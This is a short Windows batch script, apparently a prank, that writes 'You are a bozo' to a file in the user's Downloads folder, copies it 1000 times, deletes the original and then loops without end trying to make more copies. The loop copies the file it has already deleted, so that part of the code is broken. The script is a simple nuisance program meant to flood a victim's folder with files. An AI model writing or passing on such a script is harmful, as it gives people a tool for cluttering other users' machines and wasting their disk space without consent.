@echo off
set /A y = 1
cd %homepath%
cd downloads
echo You are a bozo > Bozo.txt
for /l %%x in (1, 1, 1000) do (
copy Bozo.txt Bozo%%x.txt
)
del Bozo.txt
:start
for /l %%x in (1, 1, 1000) do (
copy Bozo.txt Bozo%y%%%x.txt
)
set /A y = %y% + 1
goto :Start
